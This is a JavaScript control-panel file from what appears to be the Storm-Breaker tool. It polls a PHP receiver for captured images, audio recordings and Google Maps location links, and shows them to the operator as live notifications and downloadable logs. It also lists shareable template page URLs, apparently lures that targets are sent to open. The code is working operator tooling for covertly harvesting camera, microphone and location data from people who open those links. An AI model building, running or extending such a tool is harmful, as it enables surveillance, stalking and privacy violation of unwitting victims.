var old_data = '';
var log_history = []; // Store logs for download

function Listener() {
    $.post("receiver.php", { "send_me_result": "" }, function (data) {
        if (data != "") {
            // Parse data if possible or handle raw string
            // The PHP backend seems to send raw strings.

            var timestamp = new Date().toLocaleTimeString();
            var logType = 'info';
            var displayData = data;

            if (data.includes("Image")) {
                show_notif("Image File Saved", 'Path : ' + data.slice(26), true);
                logType = 'image';
            } else if (data.includes("Audio")) {
                show_notif("Audio File Saved", 'Path : ' + data.slice(26), false);
                logType = 'image'; // Reuse color for media
            } else if (data.includes("Google Map")) {
                show_notif("Google Map Link", data.slice(18), true);
                logType = 'success';
            }

            // Append to Terminal
            var logEntry = `
                <div class="log-entry">
                    <span class="log-time">[${timestamp}]</span>
                    <span class="log-content ${logType}">${displayData}</span>
                </div>
            `;

            $("#log-terminal").append(logEntry);

            // Auto scroll to bottom
            var terminal = document.getElementById("log-terminal");
            terminal.scrollTop = terminal.scrollHeight;

            // Store for download
            log_history.push(`[${timestamp}] ${data}`);
        }
    });
}

function getFullLogs() {
    return log_history.join("\n");
}

function show_notif(msg, path, status) {
    var btn_text = 'open file';
    var timer = 5000;
    var type_notif = "success";

    if (msg.includes("available")) {
        btn_text = "open link";
        timer = 0;
        type_notif = "danger";
    } else if (msg.includes("Google Map")) {
        btn_text = "open link";
        timer = 0;
    }

    GrowlNotification.notify({
        title: msg,
        description: path,
        type: type_notif,
        closeTimeout: timer,
        showProgress: true,
        showButtons: status,
        buttons: {
            action: {
                text: btn_text,
                callback: function () {
                    window.open(path.replace("Path : ", ""), 'popUpWindow', 'height=640,width=640,left=1000,top=300,resizable=yes,scrollbars=yes,toolbar=yes,menubar=no,location=no,directories=no, status=yes');
                }
            },
            cancel: {
                text: 'Cancel',
                callback: function () { }
            }
        },
    });
}

function getRandomInt(max) {
    return Math.floor(Math.random() * max);
}

function saveTextAsFile(textToWrite, fileNameToSaveAs) {
    var textFileAsBlob = new Blob([textToWrite], { type: 'text/plain' });
    var downloadLink = document.createElement("a");
    downloadLink.download = getRandomInt(10000) + "_" + fileNameToSaveAs;
    if (window.webkitURL != null) {
        downloadLink.href = window.webkitURL.createObjectURL(textFileAsBlob);
    } else {
        downloadLink.href = window.URL.createObjectURL(textFileAsBlob);
        downloadLink.onclick = destroyClickedElement;
        downloadLink.style.display = "none";
        document.body.appendChild(downloadLink);
    }
    downloadLink.click();
}

function check_new_version() {
    var last_version = 0;
    $.get("Settings.json", function (data) {
        last_version += data.version;
    });

    function check_version_on_git() {
        $.get("https://raw.githubusercontent.com/ultrasecurity/Storm-Breaker/main/Settings.json", function (data) {
            new_version = JSON.parse(data);
            if (last_version < new_version.version) {
                show_notif("New version available :)", "https://github.com/ultrasecurity/Storm-Breaker", true);
            }
        });
    }
    setTimeout(check_version_on_git, 2000);
}

$(document).ready(function () {
    // Load Templates
    $.post("list_templates.php", function (data) {
        var get_json = JSON.parse(data);
        var linksHtml = '';

        for (let i = 0; i < get_json.length; i++) {
            var url = "http://" + location.host + "/templates/" + get_json[i] + "/index.html";
            linksHtml += `
                <div class="link-item">
                    <span class="link-url">${url}</span>
                    <button class="btn-copy" data-url="${url}">
                        <i class="fas fa-copy"></i> Copy
                    </button>
                </div>
            `;
        }
        $("#links-container").html(linksHtml);

        // Bind Copy Events
        $(".btn-copy").click(function () {
            var url = $(this).data('url');
            navigator.clipboard.writeText(url);

            const originalText = $(this).html();
            $(this).html('<i class="fas fa-check"></i> Copied');
            setTimeout(() => {
                $(this).html(originalText);
            }, 2000);

            Swal.fire({
                icon: 'success',
                title: 'Copied!',
                text: url,
                timer: 1500,
                showConfirmButton: false
            });
        });
    });

    // Listener Control
    var timer = setInterval(Listener, 2000);
    var isListening = true;

    $("#btn-listen").click(function () {
        if (isListening) {
            clearInterval(timer);
            console.log("stopped listener");
            $(this).html('<i class="fas fa-play"></i> Start Listener').removeClass('btn-danger').addClass('btn-success');
            isListening = false;
        } else {
            timer = setInterval(Listener, 2000);
            console.log("started listener");
            $(this).html('<i class="fas fa-stop"></i> Stop Listener').removeClass('btn-success').addClass('btn-danger');
            isListening = true;
        }
    });

    // Clear Logs
    $("#btn-clear").click(function () {
        $("#log-terminal").html(`
            <div class="log-entry">
                <span class="log-time">[System]</span>
                <span class="log-content">Logs cleared. Waiting for interactions...</span>
            </div>
        `);
        log_history = [];
    });
});